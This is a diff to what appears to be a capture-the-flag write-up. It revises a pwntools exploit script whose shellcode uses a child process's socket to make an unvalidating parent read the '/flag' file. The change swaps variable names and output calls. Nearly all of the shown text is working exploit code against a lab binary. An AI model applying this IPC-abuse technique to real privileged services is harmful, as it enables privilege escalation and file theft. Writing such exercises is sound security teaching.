@@ -150,16 +150,16 @@ Because the parent performs no validation on `command_argument`, the child can r
 ```python
 from pwn import *
 
-context.arch = "amd64"
+elf = context.binary = ELF("./challenge")
 
-pc = process("./c_binary")
+p = process(elf.path)
 
 # Constants
 CHILD_SOCKET_FD = 4
 SHELLCODE_BASE = 0x1337000
 BUF_ADDR = SHELLCODE_BASE + 0x900
 
-# Refactored shellcode using shellcraft
+# Shellcraft exploit for readability and conciseness
 sc = ""
 # 1. Send "read_file\0/flag" (128 bytes)
 sc += shellcraft.pushstr(b"read_file\x00/flag".ljust(128, b"\x00"))
@@ -183,7 +183,6 @@ sc += shellcraft.exit(0)
 
 shellcode = asm(sc)
 
-
-pc.send(shellcode.ljust(0x1000, b"\0"))
-print(pc.clean().decode())
+p.send(shellcode.ljust(0x1000, b"\0"))
+print(p.recvall().decode())
 ```
